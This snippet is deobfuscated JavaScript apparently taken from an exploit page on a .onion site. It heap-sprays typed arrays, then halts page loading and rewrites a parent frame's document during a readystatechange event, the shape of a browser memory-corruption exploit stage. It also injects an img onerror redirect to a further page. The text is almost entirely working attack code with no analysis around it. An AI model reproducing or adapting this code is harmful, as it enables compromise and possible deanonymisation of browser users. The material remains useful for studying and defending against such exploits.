
//nl7qbezu7pqsuone.onion/content_3.html:
//Deobfuscated code below
//<script>
var y = "?????",
    z = "",
    z = z + "<body",
    z = z + ">",
    z = z + "<img",
    z = z + " height='1' width='1' src='error.html'",
    z = z + ' onerror="javascript: ',
    z = z + ("window.location.href='content_2.html" + y + "';\" "),
    z = z + ">",
    z = z + "</body",
    z = z + ">",
    flag = !1,
    var83 = 0;

function b() {
    for (var e = Array(1024), d = Array(1024), c = 0; 1024 > c; c++) e[c] = new ArrayBuffer(180);
    for (c = 0; 1024 > c; c++) d[c] = new Int32Array(e[c], 0, 45), d[c][9] = var83;
    return d
}

function a() {
    !1 == flag && (flag = !0, window.stop());
    window.stop();
    b();
    window.parent.frames[0].frameElement.ownerDocument.write(z);
    b()
}
var83 = parent.df();
0 != var83 && document.addEventListener("readystatechange", a, !1);
//</script>